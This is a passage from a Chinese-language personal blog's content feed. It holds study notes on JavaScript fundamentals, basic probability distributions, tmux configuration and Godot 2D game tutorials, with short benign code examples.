 <span class="hljs-comment">// &quot;10&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num.<span class="hljs-title function_">toString</span>(<span class="hljs-number">2</span>));  <span class="hljs-comment">// &quot;1010&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num.<span class="hljs-title function_">toString</span>(<span class="hljs-number">8</span>));  <span class="hljs-comment">// &quot;12&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num.<span class="hljs-title function_">toString</span>(<span class="hljs-number">10</span>)); <span class="hljs-comment">// &quot;a&quot;</span><br></code></pre></td></tr></table></figure><p>另一个方法是用 <code>String()</code>.</p><h4 id="4-模板字面量"><a href="#4-模板字面量" class="headerlink" title="4. 模板字面量"></a>4. 模板字面量</h4><p>具体见书</p><h4 id="5-字符串插值"><a href="#5-字符串插值" class="headerlink" title="5. 字符串插值"></a>5. 字符串插值</h4><p>也就是在字符串中插入变量, 使用 <code>$&#123;&#125;</code>, 如:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> value = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">let</span> exponent = <span class="hljs-string">&#x27;second&#x27;</span>;<br><span class="hljs-keyword">let</span> interpolatedString = <span class="hljs-string">&quot;value is $&#123;value&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>插入的值会被 <code>toString()</code> 强制转换为字符串 。</p><h4 id="6-模板字面量标签函数-tag-function"><a href="#6-模板字面量标签函数-tag-function" class="headerlink" title="6. 模板字面量标签函数 tag function"></a>6. 模板字面量标签函数 tag function</h4><p>见书</p><h4 id="7-原始字符串"><a href="#7-原始字符串" class="headerlink" title="7. 原始字符串"></a>7. 原始字符串</h4><p>见书</p><h3 id="3-4-7-Symbol-类型"><a href="#3-4-7-Symbol-类型" class="headerlink" title="3.4.7 Symbol 类型"></a>3.4.7 Symbol 类型</h3><p>符号用来创建唯一记号.</p><h4 id="1-符号的基本用法"><a href="#1-符号的基本用法" class="headerlink" title="1. 符号的基本用法"></a>1. 符号的基本用法</h4><p>值为符号的变量需要用 <code>Symbol()</code> 函数初始化:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> sym = <span class="hljs-title class_">Symbol</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> sym);<br></code></pre></td></tr></table></figure><p>可以给 <code>Symbol()</code> 传入一个参数作为符号的描述，但是这个值和符号本身的值无关.</p><p><code>Symbol()</code> 函数不能和 <code>new</code> 关键字一起作为构造函数使用.</p><h4 id="2-使用全局符号注册表"><a href="#2-使用全局符号注册表" class="headerlink" title="2. 使用全局符号注册表"></a>2. 使用全局符号注册表</h4><p>见书.</p><h4 id="3-使用符号作为属性"><a href="#3-使用符号作为属性" class="headerlink" title="3. 使用符号作为属性"></a>3. 使用符号作为属性</h4><p>凡是可以使用字符串或数值作为属性的地方，都可以使用符号.</p><p>如用作散列的键.</p><h4 id="4-常用内置符号"><a href="#4-常用内置符号" class="headerlink" title="4. 常用内置符号"></a>4. 常用内置符号</h4><p>见书.</p><h3 id="3-4-8-Object-类型"><a href="#3-4-8-Object-类型" class="headerlink" title="3.4.8 Object 类型"></a>3.4.8 Object 类型</h3><p>ECMAScript 中的对象其实就是一组数据和功能的集合.</p><p>对象通过 <code>new</code> 操作符后跟对象类型的名称来创建, 开发者可以通过创建 Object 类型的实例来创建自己的对象，然后再给对象添加属性和方法:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> o = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br></code></pre></td></tr></table></figure><p>可以省略括号但不推荐.</p><p>Object 对象所含的属性和方法，见书.</p><p><code>valueOf()</code> 返回对象对应的字符串，数值或布尔值表示.</p><h2 id="3-5-操作符"><a href="#3-5-操作符" class="headerlink" title="3.5 操作符"></a>3.5 操作符</h2><p>+, -, *, &#x2F;, %, 以及递增，递减都和 C 相同.</p><h3 id="3-5-2-位操作符"><a href="#3-5-2-位操作符" class="headerlink" title="3.5.2 位操作符"></a>3.5.2 位操作符</h3><p>ECMAScript 中的所有数值都是以 IEEE 754 64 位格式存储，但位操作并不直接应用到 64 位表示， 而是先把值转换为 32 位整数，再进行位操作，之后再把结果转换为 64 位. 因此只需要考虑 32 位整数.</p><p>负值以一种称为 <mark>二补数 (或补码)</mark>  的二进制编码存储.</p><p>符号:</p><ul><li><code>~</code>, 非</li><li><code>&amp;</code>, 与</li><li><code>|</code>, 或</li><li><code>^</code>, 异或</li><li><code>&lt;&lt;</code>, 左移</li><li><code>&gt;&gt;</code>, 右移</li><li><code>&gt;&gt;&gt;</code>, 无符号右移</li></ul><h3 id="3-5-5-指数操作符"><a href="#3-5-5-指数操作符" class="headerlink" title="3.5.5 指数操作符"></a>3.5.5 指数操作符</h3><p><code>**</code></p><h3 id="3-5-8-相等操作符"><a href="#3-5-8-相等操作符" class="headerlink" title="3.5.8 相等操作符"></a>3.5.8 相等操作符</h3><h4 id="2-全等和不全等"><a href="#2-全等和不全等" class="headerlink" title="2. 全等和不全等"></a>2. 全等和不全等</h4><p><code>===</code> 和 <code>!==</code>, 推荐使用，不存在类型转换问题.</p><h2 id="3-6-语句"><a href="#3-6-语句" class="headerlink" title="3.6 语句"></a>3.6 语句</h2><p>if, do-while, while, for, for-in, for-of.</p><h3 id="3-6-7-标签语句"><a href="#3-6-7-标签语句" class="headerlink" title="3.6.7 标签语句"></a>3.6.7 标签语句</h3><h3 id="3-6-8-break-和-continue"><a href="#3-6-8-break-和-continue" class="headerlink" title="3.6.8 break 和 continue"></a>3.6.8 break 和 continue</h3><h3 id="3-6-9-with-语句"><a href="#3-6-9-with-语句" class="headerlink" title="3.6.9 with 语句"></a>3.6.9 with 语句</h3><p>将代码作用域设置为特定对象，如:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> qs = location.<span class="hljs-property">search</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">let</span> hostname = location.<span class="hljs-property">hostname</span>;<br><span class="hljs-keyword">let</span> url = location.<span class="hljs-property">href</span>;<br></code></pre></td></tr></table></figure><p>等价于:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">with</span>(<span class="hljs-params">location</span>) &#123;<br>        <span class="hljs-keyword">let</span> qs = search.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">let</span> hostname = hostname;<br>        <span class="hljs-keyword">let</span> url = href;<br>    &#125;<br></code></pre></td></tr></table></figure><p>不推荐使用，原因见书.</p><h3 id="3-6-10-switch"><a href="#3-6-10-switch" class="headerlink" title="3.6.10 switch"></a>3.6.10 switch</h3><h2 id="3-7-函数"><a href="#3-7-函数" class="headerlink" title="3.7 函数"></a>3.7 函数</h2><p>语法:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">functionName</span>(<span class="hljs-params">arg0, arg1...</span>) &#123;<br>    statements<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="第4章-变量，作用域与内存"><a href="#第4章-变量，作用域与内存" class="headerlink" title="第4章 变量，作用域与内存"></a>第4章 变量，作用域与内存</h1><h2 id="4-1-原始值与引用值"><a href="#4-1-原始值与引用值" class="headerlink" title="4.1 原始值与引用值"></a>4.1 原始值与引用值</h2><p>JavaScript 不允许直接访问内存位置，因此也就不能直接操作对象所在的内存空间。在操作对象时，实际上操作的是对该对象的引用 (reference) 而非实际的对象本身.</p><p>原始值 (primitive value) 是最简单的数据. (Undefined, Null, Boolean, Number, String 和 Symbol)</p><p>引用值 (reference value) 是对对象的引用.</p><h3 id="4-1-1-动态属性"><a href="#4-1-1-动态属性" class="headerlink" title="4.1.1 动态属性"></a>4.1.1 动态属性</h3><p>引用值可以随时添加属性和方法. 而原始值不能.</p><h3 id="4-1-2-复制值"><a href="#4-1-2-复制值" class="headerlink" title="4.1.2 复制值"></a>4.1.2 复制值</h3><p>引用值复制的值其实是一个指针, 它指向存储在堆内存中的对象.</p><h3 id="4-1-3-传递参数"><a href="#4-1-3-传递参数" class="headerlink" title="4.1.3 传递参数"></a>4.1.3 传递参数</h3><p>按值传递.</p><h3 id="4-1-4-确定类型"><a href="#4-1-4-确定类型" class="headerlink" title="4.1.4 确定类型"></a>4.1.4 确定类型</h3><p>使用 <code>instanceof</code> 操作符，判断一个对象是不是某个对象类型:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">result = variable <span class="hljs-keyword">instanceof</span> constructor<br></code></pre></td></tr></table></figure><p>如:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>); <span class="hljs-comment">// 变量 person 是 Object 吗?</span><br></code></pre></td></tr></table></figure><h2 id="4-2-执行上下文与作用域"><a href="#4-2-执行上下文与作用域" class="headerlink" title="4.2 执行上下文与作用域"></a>4.2 执行上下文与作用域</h2><p>每个上下文都有一个关联的 <mark>变量对象 (variable object)</mark>, 而这个上下文中定义的所有变量和函数都存在于这个对象上。虽然无法是通过代码访问变量对象，但后台处理数据会用到它.</p><h2 id="4-3-垃圾回收"><a href="#4-3-垃圾回收" class="headerlink" title="4.3 垃圾回收"></a>4.3 垃圾回收</h2><p>垃圾回收就是执行环境负责在代码执行时管理内存.</p><p>基本思路就是: 确定哪个变量不会再使用，然后释放它占用的内存. 这个过程是周期性的，即垃圾回收程序每隔一定时间就会自动运行.</p><p>垃圾回收程序必须追踪纪录哪个变量还会使用，两种主要的标记方法.</p><h3 id="4-3-1-标记清理-mark-and-sweep"><a href="#4-3-1-标记清理-mark-and-sweep" class="headerlink" title="4.3.1 标记清理 (mark-and-sweep)"></a>4.3.1 标记清理 (mark-and-sweep)</h3><h3 id="4-3-2-引用计数-reference-couning"><a href="#4-3-2-引用计数-reference-couning" class="headerlink" title="4.3.2 引用计数 (reference couning)"></a>4.3.2 引用计数 (reference couning)</h3><p>引用数为 0 时回收.</p><h3 id="4-3-3-性能"><a href="#4-3-3-性能" class="headerlink" title="4.3.3 性能"></a>4.3.3 性能</h3><h3 id="4-3-4-内存管理"><a href="#4-3-4-内存管理" class="headerlink" title="4.3.4 内存管理"></a>4.3.4 内存管理</h3><p>将变量设置为 null 来释放引用.</p><h1 id="第5章-基本引用类型"><a href="#第5章-基本引用类型" class="headerlink" title="第5章 基本引用类型"></a>第5章 基本引用类型</h1><p>引用类型虽然有点像类，但跟类并不是一个概念.</p><h2 id="5-1-Date"><a href="#5-1-Date" class="headerlink" title="5.1 Date"></a>5.1 Date</h2><p>创建日期对象:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> now = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br></code></pre></td></tr></table></figure><h2 id="5-2-RegExp"><a href="#5-2-RegExp" class="headerlink" title="5.2 RegExp"></a>5.2 RegExp</h2><p>ECMAScript 通过 RegExp 类型支持正则表达式. 正则表达式使用类似 Perl 的简洁语法来创建:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> expression = <span class="hljs-regexp">/pattern/</span>flags;<br></code></pre></td></tr></table></figure><p><img src="/../img/javascript_regex_flags.png"></p><p>也可以通过 RegExp 构造函数栏创建:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> pattern = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&quot;[bc]at&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>);<br></code></pre></td></tr></table></figure><p>这种方法，元字符需要二次转义.</p><h2 id="5-3-原始值包装类型"><a href="#5-3-原始值包装类型" class="headerlink" title="5.3 原始值包装类型"></a>5.3 原始值包装类型</h2><h2 id="5-4-单例内置对象"><a href="#5-4-单例内置对象" class="headerlink" title="5.4 单例内置对象"></a>5.4 单例内置对象</h2><p>Global 和 Math.</p>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于随机变量的理解</title>
    <link href="/2022/11/22/%E5%85%B3%E4%BA%8E%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <url>/2022/11/22/%E5%85%B3%E4%BA%8E%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/150295256">参考</a></p><p>在概率统计中, 随机变量: 变量中的值是随机现象的结果.</p><p>比如: $P(X&#x3D;3)$</p><p>这里的随机变量是 X, 它的值是 3. 变量 X 的值其实不一定为 3，是随机的，而我们要的就是当这个随机值是 3 时的概率.</p><p>随机变量不同于代数中的变量，因为它具有一组完整的值, 并且可以随机获取任何值。</p>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于指数分布的理解</title>
    <link href="/2022/11/22/%E5%85%B3%E4%BA%8E%E6%8C%87%E6%95%B0%E5%88%86%E5%B8%83%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <url>/2022/11/22/%E5%85%B3%E4%BA%8E%E6%8C%87%E6%95%B0%E5%88%86%E5%B8%83%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.zhihu.com/question/354825596/answer/893242882">参考</a></p><p>指数分布这个名字，是由于其分布是 $e$ 的指数倍.</p><p>关于 “无记忆性”: 未来我还需要等多长时间，跟我已经等了多长时间没有关系. 意思就是以前等了多久和你还要等多久没有关系。也比如抽奖，中奖的概率不会因为你抽的次数变多而变高.</p><p>$P(X &gt; s|X &gt; t) &#x3D; P(X &gt; s-t), s &gt; t$</p>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>正态分布名字的由来</title>
    <link href="/2022/11/22/%E6%AD%A3%E6%80%81%E5%88%86%E5%B8%83%E5%90%8D%E5%AD%97%E7%9A%84%E7%94%B1%E6%9D%A5/"/>
    <url>/2022/11/22/%E6%AD%A3%E6%80%81%E5%88%86%E5%B8%83%E5%90%8D%E5%AD%97%E7%9A%84%E7%94%B1%E6%9D%A5/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/128809461">参考</a></p><p>正态分布 (normal distribution). 由于这种数据分布太过于常见，基本能描述所有常见的事务和现象，因此为 normal 的 distribution.</p>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>理解概率密度函数</title>
    <link href="/2022/11/22/%E7%90%86%E8%A7%A3%E6%A6%82%E7%8E%87%E5%AF%86%E5%BA%A6%E5%87%BD%E6%95%B0/"/>
    <url>/2022/11/22/%E7%90%86%E8%A7%A3%E6%A6%82%E7%8E%87%E5%AF%86%E5%BA%A6%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.zhihu.com/question/263467674/answer/1117758894">参考</a></p><p>当我们求的概率可以用一个面积和总面积之比求得时，我们称这种方法为概率密度函数.</p><p><img src="/../img/Probability_density_function.png"></p>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>为什么叫几何分布和超几何分布</title>
    <link href="/2022/11/21/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AB%E5%87%A0%E4%BD%95%E5%88%86%E5%B8%83%E5%92%8C%E8%B6%85%E5%87%A0%E4%BD%95%E5%88%86%E5%B8%83/"/>
    <url>/2022/11/21/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AB%E5%87%A0%E4%BD%95%E5%88%86%E5%B8%83%E5%92%8C%E8%B6%85%E5%87%A0%E4%BD%95%E5%88%86%E5%B8%83/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.zhihu.com/question/40608734/answer/1275366068">参考 知乎</a></p><p>等比数列又称几何数列. 几何分布就是各项构成等比数列.<br>$$<br>P(\xi &#x3D; n) &#x3D; g(g; n) &#x3D; p(1-p)^{n-1} (n \in N^{*})<br>$$</p><p>把等比级数推广可以得到超几何级数, 其前后项比是一个 n 的有理函数.<br>$$<br>\frac{\beta_{n+1}}{\beta_n} &#x3D; \frac{P(n)}{Q(n)}<br>$$</p><p>超几何就是推广的几何.</p><p>超几何分布就是它的分布项的每一项正好是某个超几何级数中的项.</p>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是几何</title>
    <link href="/2022/11/21/%E4%BB%80%E4%B9%88%E6%98%AF%E5%87%A0%E4%BD%95/"/>
    <url>/2022/11/21/%E4%BB%80%E4%B9%88%E6%98%AF%E5%87%A0%E4%BD%95/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.zhihu.com/question/303558027/answer/947487152">参考 知乎</a></p><p>大多数令人感到费解的词汇都是从国外音译过来的.</p><p>geometria 的开头 geo- 与几何相似. geometria 的拉丁含义为测地数.</p>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Godot-技巧积累</title>
    <link href="/2022/11/21/Godot-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/"/>
    <url>/2022/11/21/Godot-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="关于节点之间信息的传递"><a href="#关于节点之间信息的传递" class="headerlink" title="关于节点之间信息的传递"></a>关于节点之间信息的传递</h1><p>父节点直接传递变量和子节点沟通.</p><p>子节点用信号和父节点沟通.</p>]]></content>
    
    
    <categories>
      
      <category>Godot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>tmux-配置</title>
    <link href="/2022/11/19/tmux-%E9%85%8D%E7%BD%AE/"/>
    <url>/2022/11/19/tmux-%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>其配置文件的内容实际上就是命令行中 <code>tmux + ...</code> 的内容，可以在 manpage 中查看.</p><p><code>set</code> 和 <code>set-option</code> 似乎含义相同. <code>set</code> 是 <code>set-option</code> 的 alias.</p><p><code>show</code> 是 <code>show-options</code> 的 alias.</p><p><code>bind</code> 是 <code>bind-key</code> 的 alias. 将一个键位和 tmux 命令绑定.</p><p><code>send</code> 是 <code>send-keys</code> 的 alias. 和 <code>send-prefix</code> 都是方便没有切换到一个 window 上面时对其发送指令.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-tmux-配置文件不起作用</title>
    <link href="/2022/11/18/%E5%85%B3%E4%BA%8E-tmux-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%8D%E8%B5%B7%E4%BD%9C%E7%94%A8/"/>
    <url>/2022/11/18/%E5%85%B3%E4%BA%8E-tmux-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%8D%E8%B5%B7%E4%BD%9C%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://superuser.com/questions/188491/tmux-disregarding-the-configuration-file">参考</a></p><p>其原因为，tmux server 在运行后, 这时修改 tmux 的配置文件，其并没有读取 (就算使用 <code>-f</code> 选项).</p><p>需要重启 tmux server.</p><p>先用 tmux list-sessions 列出所有已经打开的 sessions, 用 tmux attach 连接后将其全部退出.</p><p>或者使用 <code>killall tmux</code> or <code>tmux kill-server</code> 来关闭.</p><p>在  tmux 中，可以使用 <code>source-file ~/.tmux.conf</code> 来读取配置文件.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Godot-官方-2D-游戏制作项目示例</title>
    <link href="/2022/11/18/Godot-%E5%AE%98%E6%96%B9-2D-%E6%B8%B8%E6%88%8F%E5%88%B6%E4%BD%9C%E9%A1%B9%E7%9B%AE%E7%A4%BA%E4%BE%8B/"/>
    <url>/2022/11/18/Godot-%E5%AE%98%E6%96%B9-2D-%E6%B8%B8%E6%88%8F%E5%88%B6%E4%BD%9C%E9%A1%B9%E7%9B%AE%E7%A4%BA%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="参考-B-站教程"><a href="#参考-B-站教程" class="headerlink" title="参考 B 站教程"></a><a href="https://www.bilibili.com/video/BV1pt411p7DK/?spm_id_from=333.880.my_history.page.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考 B 站教程</a></h1><h2 id="在-Godot-中输入汉字"><a href="#在-Godot-中输入汉字" class="headerlink" title="在 Godot 中输入汉字"></a>在 Godot 中输入汉字</h2><p>首先将字体文件放入项目的根目录下, 以 label 节点为例，在右边栏往下拉:<br><img src="/../img/godot_add_chinese.png"></p><p>在这个地方选择你添加进来的汉字.</p><p>注意还需打开 Setting 下的 Use Mipmaps 和 Use Filter.</p><h2 id="创建-Player-场景"><a href="#创建-Player-场景" class="headerlink" title="创建 Player 场景"></a>创建 Player 场景</h2><p>调整 Player 的大小可以在右边栏 Node2D -&gt; Transform -&gt; Scale 下调节.</p><p>关于角色的贴图为什么叫 Sprite (精灵), 因为如果不加上碰撞体，它就是虚的，无法接触到，所以是精灵.</p><p>防止对角线速度是 x, y 轴的叠加，需要先将速度 normalized.</p><h2 id="动画的播放"><a href="#动画的播放" class="headerlink" title="动画的播放"></a>动画的播放</h2><p>停止动画有 <code>stop()</code> 方法.</p><p>需要记住，所有的节点的属性都可以用代码修改. 包括当前播放的是哪一个动画.</p><h2 id="设置了速度之后还需要更新位置-position"><a href="#设置了速度之后还需要更新位置-position" class="headerlink" title="设置了速度之后还需要更新位置 position"></a>设置了速度之后还需要更新位置 position</h2><h2 id="设置碰撞体"><a href="#设置碰撞体" class="headerlink" title="设置碰撞体"></a>设置碰撞体</h2><p>可以在代码中直接关掉碰撞的检测. 用 <code>disabled</code> 属性.</p><h2 id="设置敌人"><a href="#设置敌人" class="headerlink" title="设置敌人"></a>设置敌人</h2><p>一般来说，KinematicBody2D 一般用作 Player, 而 RigidBody2D 一般用作敌人.</p><p>把 RigidBody2D 中右边栏 Gravity Scale 调为 0，就不会自动往下掉.</p><p>敌人的随机状态利用随机数来处理.</p><p>可以先用 <code>animation</code> 属性来确定播放哪一个动画，再使用 <code>play()</code> 方法来播放.</p><p>VisibilityNotifier2D 这个节点有一个信号，可以让物体在离开屏幕时触发. 其描述就是 “Detects approximately when the node is visible on screen.”</p><h2 id="设置主世界"><a href="#设置主世界" class="headerlink" title="设置主世界"></a>设置主世界</h2><p>利用 Timer 节点来控制敌人的生成, 游戏开始时的倒计时, 以及分数计数.</p><p>用 Position2D 节点来设定 Player 的初始位置. 其描述为 “It’s just like a plain Node2D, but it displays as a cross in the 2D editor at all times.” 也就是说和 Node2D 是一样的.</p><p>利用 Path2D 和 PathFollow2D 来为敌人的生成设定初始点. 其利用随机数在 PathFollow2D 对 Path2D 的 offset 上随机取一个点，然后从这个点生成敌人.</p><p><code>PI</code> 表示 $\pi$</p><p>敌人是 RigidBody2D，因此可以直接在代码中设置线性速度.</p><p>一般添加 UI 放在 CanvasItem 节点下.</p><h2 id="添加背景"><a href="#添加背景" class="headerlink" title="添加背景"></a>添加背景</h2><p>使用 ColorRect 节点. 然后在 Layout 中选择 Full Rect 自动铺满.</p><h2 id="添加音效"><a href="#添加音效" class="headerlink" title="添加音效"></a>添加音效</h2><p>使用 AudioStreamPlayer 节点.</p><p>Godot 不支持 Mp3 格式，用 Wav 和 Ogg 格式.</p><h2 id="添加粒子特效"><a href="#添加粒子特效" class="headerlink" title="添加粒子特效"></a>添加粒子特效</h2><p>使用 Particles2D 节点.</p><p>修改 particle 数量，右边栏 Amount, 这里改成 10.</p><p>需要新建材质: 右边栏 Process Material -&gt; New ParticlesMaterial</p><p>需要将重力调为零: 右边栏 Gravity -&gt; 0,0,0</p><p>调整重影从半透明到透明的颜色渐变: 右边栏 -&gt; Color -&gt; Color Ramp -&gt; GradientTexture -&gt; Gradient -&gt; New Gradient 点击进入后看下方.</p><p>回到 Particles2D, 右边栏 Textures -&gt; Texture, 添加图片. 将 Drawing -&gt; Local Conrds 取消勾选.</p><p>又回到 Material 里面添加缩放曲线. Scale -&gt; Scale Curve</p><h1 id="1-Setting-up-the-project"><a href="#1-Setting-up-the-project" class="headerlink" title="1. Setting up the project"></a>1. Setting up the project</h1><p>每一个游戏的运行窗口大小不同，需要提前设置.</p><p>开启 Stretch 下的 Mode -&gt; 2D 和 Aspect -&gt; keep. 可以将窗口大小保持在你设定的大小而不会随着拉伸变化. </p><p>创建三个独立的 scenes:</p><ul><li>Player</li><li>Mod</li><li>HUD</li></ul><p>还会有一个 Main scene.</p><h1 id="2-Creating-the-player-scene"><a href="#2-Creating-the-player-scene" class="headerlink" title="2. Creating the player scene"></a>2. Creating the player scene</h1><p>独立出一个 Player scene 的好处好处在于可以单独测试.</p>]]></content>
    
    
    <categories>
      
      <category>Godot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Godot-制作-像素游戏-B站教程-Notes</title>
    <link href="/2022/11/13/Godot-%E5%88%B6%E4%BD%9C-%E5%83%8F%E7%B4%A0%E6%B8%B8%E6%88%8F-B%E7%AB%99%E6%95%99%E7%A8%8B-Notes/"/>
    <url>/2022/11/13/Godot-%E5%88%B6%E4%BD%9C-%E5%83%8F%E7%B4%A0%E6%B8%B8%E6%88%8F-B%E7%AB%99%E6%95%99%E7%A8%8B-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV15D4y1U7j5/?spm_id_from=333.880.my_history.page.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考</a></p><h1 id="P1-最后成果、资源导入、项目设置、角色移动基础"><a href="#P1-最后成果、资源导入、项目设置、角色移动基础" class="headerlink" title="P1. 最后成果、资源导入、项目设置、角色移动基础"></a>P1. 最后成果、资源导入、项目设置、角色移动基础</h1><p>将主场景保存在工作目录下的根目录，而不是子目录.</p><p>运行游戏之前要选择一个场景，也就是一个 <code>.tscn</code> 文件, <code>scn</code> 应该是 sceen 的缩写.</p><p>需要设置更适合像素风的窗口大小，在 Project -&gt; Project Setting -&gt; Display -&gt; Window 下设置.</p><p>如:<br><img src="/../img/size_to_suit_pixel.png"></p><p>还需要修改下面的 Stretch -&gt; Mode -&gt; 2D</p><p>场景是 nodes 的集合. nodes 是挂载在场景之下的. nodes 为树状.</p><p>字节点的移动是相对于父节点的.</p><p>选择 KinematicBody2D 作为角色的节点. 其为物理碰撞体.</p><p>StaticBody 用于游戏中不会移动的物体.</p><p>RigidBody 用于使用物理系统运动的物体.</p><p>一个显示了很多帧的图片，可以通过调整右侧边栏的 Animation -&gt; Hframes 将其合并. Hframes 中的 H 是 Horizontal.</p><p>将脚本创建到与图片同一个文件夹并挂载.</p><p>脚本基于哪一个节点创建的就继承哪一个节点的对象, 日:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">extends</span> <span class="hljs-title class_">KinematicBody2D</span><br></code></pre></td></tr></table></figure><p>比如这个脚本挂载到一个 KinematicBody2D node 之下，当场景中的这个节点准备就绪时，ready 函数就运行.</p><p><code>_physic_process(delta)</code> 函数在每次物理引擎更新时调用.</p><p><code>delta</code> 变量是一个恒定常量，指上一帧花费的时间.</p><p>任何不懂的代码可以直接在 Search Help 中搜索.</p><p>获取输入使用 <code>Input</code>, 要让人物移动，需要使用 <code>move_and_collide(velocity)</code> 函数.</p><p><code>Vector2.ZERO</code> 的含义就是 (0, 0).</p><h1 id="P2-关于delta、优化移动"><a href="#P2-关于delta、优化移动" class="headerlink" title="P2. 关于delta、优化移动"></a>P2. 关于delta、优化移动</h1><p><mark>回调函数</mark> , 回调实际上就是重复执行这个函数.</p><p><code>_physic_process</code> 中 <code>delta</code> 的值不会变，一直是 1&#x2F;60 (也就是说固定 1&#x2F;60 秒调用一次). 要区分其和 <code>_process</code> 中的 <code>delta</code>.</p><ul><li><code>_physic_process</code> 和真实时钟同步. 是固定的。</li><li><code>_process</code> 和运行的帧率有关</li></ul><p>速度乘以 <code>delta</code> 的目的是将速度从 x 每帧变成 x 